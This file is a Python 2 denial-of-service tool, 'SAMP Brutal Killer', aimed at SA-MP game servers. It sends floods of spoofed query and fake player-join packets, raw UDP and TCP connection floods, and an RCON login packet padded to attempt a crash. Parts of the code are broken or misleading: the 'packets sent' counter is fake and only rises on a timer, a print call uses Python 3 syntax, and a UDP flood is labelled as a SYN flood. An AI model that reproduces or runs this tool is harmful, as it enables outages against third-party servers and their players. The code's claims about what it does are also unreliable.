#!/usr/bin/env python2
# SAMP Brutal Killer - CxxL087 Custom Build
# Usage: python2 sampkiller.py [IP] [PORT] [THREADS]

import socket
import random
import threading
import sys
import time
from struct import pack, unpack

# ========== KONFIGURASI ==========
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 7777
THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
STOP_FLAG = False

# ========== PACKET GENERATOR ==========
def random_string(length):
    return ''.join(random.choice('\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\x7f') for _ in range(length))

# Packet 1: Query Flood (bikin server sibuk)
def query_packet():
    packet = '\x00\x00\x00\x00'  # Header SAMP
    packet += '\x69'  # ID Query
    packet += random_string(10)
    return packet

# Packet 2: Fake Player Join Flood
def join_packet():
    packet = '\x00\x00\x00\x00'
    packet += '\x6d'  # ID Player Join
    packet += random_string(24)  # Fake player name
    packet += pack('<i', random.randint(0, 1000))  # Fake score
    packet += pack('<i', random.randint(0, 500))  # Fake ping
    return packet

# Packet 3: RCON Exploit (bikin crash)
def rcon_crash():
    packet = '\x00\x00\x00\x00'
    packet += '\x68'  # ID RCON
    packet += 'login ' + 'A' * 1050  # Buffer overflow attempt
    return packet

# Packet 4: Syn Flood (fake UDP)
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1490)  # Max UDP size
    for _ in range(100):
        sock.sendto(data, (TARGET_IP, TARGET_PORT))

# Packet 5: Connection Flood (bikin koneksi half-open)
def tcp_flood():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        sock.connect((TARGET_IP, TARGET_PORT))
        sock.send('X' * 65535)
        sock.close()
    except:
        pass

# ========== ATTACK ENGINE ==========
packets = [query_packet, join_packet, rcon_crash]
attack_methods = ['udp', 'tcp', 'mixed']

def attack_udp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not STOP_FLAG:
        for _ in range(100):
            pkt = random.choice(packets)()
            sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
        udp_flood()

def attack_tcp():
    while not STOP_FLAG:
        tcp_flood()

def attack_mixed():
    sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not STOP_FLAG:
        # UDP spam
        for _ in range(50):
            pkt = random.choice(packets)()
            sock_udp.sendto(pkt, (TARGET_IP, TARGET_PORT))
        # TCP spam
        tcp_flood()

# ========== MAIN ==========
def print_banner():
    print("""
    ╔══════════════════════════════════════╗
    ║     SAMP BRUTAL KILLER v2.0          ║
    ║     CxxL087 | Renzz Special          ║
    ╚══════════════════════════════════════╝
    """)
    print("[TARGET] {}:{}".format(TARGET_IP, TARGET_PORT))
    print("[THREADS] {}".format(THREADS))
    print("[METHOD] MIXED (UDP+TCP+RCON)")
    print("[STATUS] ATTACKING... Press Ctrl+C to stop\n")

def main():
    global STOP_FLAG
    print_banner()
    
    attack_funcs = [attack_udp, attack_tcp, attack_mixed]
    active_threads = []
    
    # Start attack threads
    for i in range(THREADS):
        method = random.choice(attack_methods)
        if method == 'udp':
            t = threading.Thread(target=attack_udp)
        elif method == 'tcp':
            t = threading.Thread(target=attack_tcp)
        else:
            t = threading.Thread(target=attack_mixed)
        t.daemon = True
        t.start()
        active_threads.append(t)
    
    # Monitor
    try:
        byte_counter = 0
        while True:
            byte_counter += 1000000
            print("\r[+] Packets sent: {}M | Threads: {}".format(byte_counter/1000000, len(active_threads)), end='')
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Stopping attack...")
        STOP_FLAG = True
        print("[✓] Attack stopped. Server might be dead by now.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python2 sampkiller.py [IP] [PORT] [THREADS]")
        print("Example: python2 sampkiller.py 192.168.1.100 7777 1000")
        sys.exit(1)
    main()